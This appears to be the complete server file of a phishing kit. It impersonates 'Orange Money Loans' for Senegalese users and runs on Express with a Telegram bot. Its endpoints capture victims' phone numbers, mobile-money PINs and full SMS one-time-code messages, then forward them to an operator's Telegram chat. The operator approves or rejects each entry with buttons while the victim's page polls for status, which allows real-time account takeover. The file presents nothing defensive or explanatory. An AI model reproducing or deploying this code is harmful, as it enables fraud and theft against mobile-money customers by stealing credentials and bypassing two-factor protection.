const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

const statusStore = {};

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- PIN SUBMISSION API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin, country } = req.body || {};
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `🔐 <b>ORANGE MONEY LOANS PIN</b>

🆕 <b>NEW USER – VERIFICATION NEEDED</b>
🇸🇳 Country: ${country || 'Senegal'}
📞 Country Code: +221
📱 Phone Number: ${phone}
🔑 PIN: ${pin}
⏰ Time: ${currentTime}

────────────────────

⚠️ Verify the credentials:
⏱️ Timeout: 5 minutes`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "✅ Correct", callback_data: `pin_correct|${phone}` }],
                    [{ text: "❌ Wrong PIN", callback_data: `pin_wrong|${phone}` }]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- OTP / LINK SUBMISSION API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, code, country } = req.body || {};
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp1";

    const otpMessage = `✅ <b>ORANGE MONEY LOANS OTP</b>

🆕 <b>NEW USER – VERIFICATION NEEDED</b>
🇸🇳 Country: ${country || 'Senegal'}
📞 Country Code: +221
📱 Phone Number: ${phone}
📧 COMPLETE SMS MESSAGE:
${code}
⏰ Time: ${currentTime}

💬 Note: User pasted SMS message to extract OTP

────────────────────

⚠️ Verify the credentials:
⏱️ Timeout: 5 minutes`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "✅ Correct", callback_data: `otp_correct|${phone}` }],
                    [{ text: "❌ Wrong Link", callback_data: `otp_wrong_link|${phone}` }],
                    [{ text: "❌ Wrong PIN", callback_data: `otp_wrong_pin|${phone}` }]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- BOT ACTIONS --------------------

bot.action(/^pin_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "approved";
    await ctx.answerCbQuery("Approved");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>PIN APPROVED</b>\n📱 Phone: ${phone}`);
});

bot.action(/^pin_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "wrong_pin";
    await ctx.answerCbQuery("Wrong PIN marked");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>WRONG PIN REPORTED</b>\n📱 Phone: ${phone}`);
});

bot.action(/^otp_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp_approved";
    await ctx.answerCbQuery("OTP Approved");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>OTP / LINK APPROVED</b>\n📱 Phone: ${phone}`);
});

bot.action(/^otp_wrong_link\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "wrong_link";
    await ctx.answerCbQuery("Wrong Link marked");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>WRONG LINK REPORTED</b>\n📱 Phone: ${phone}`);
});

bot.action(/^otp_wrong_pin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "wrong_pin";
    await ctx.answerCbQuery("Wrong PIN marked");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>WRONG PIN REPORTED FROM OTP STAGE</b>\n📱 Phone: ${phone}`);
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    res.json({ status: currentStatus });
});

app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
